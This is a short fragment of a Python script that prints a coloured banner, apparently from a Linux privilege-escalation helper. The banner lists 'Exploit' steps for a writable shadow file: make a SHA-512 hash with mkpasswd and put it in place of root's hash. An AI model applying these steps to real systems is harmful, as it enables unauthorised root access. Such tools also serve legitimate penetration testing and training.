...
print("\t║",RED,"Exploit:",XX,"                                                                       ║")
print("\t║",RED,"1) Generate a new Shadow Hash and replace it with the",XX,"                          ║")
print("\t║   ",RED,"current root hash:",XX,"                                                          ║")
print("\t║    ",RED,"- mkpasswd  -m sha-512 -S prove123 -s",XX,"                                      ║")
print("\t║",RED,"2) Open the shadow file using any text edirot of your choice:",XX,"                  ║")
print("\t║   ",RED,"or copy your HASH from your system and replace it with",XX,"                      ║")
print("\t║   ",RED,"the root hash",XX,"                                                               ║")
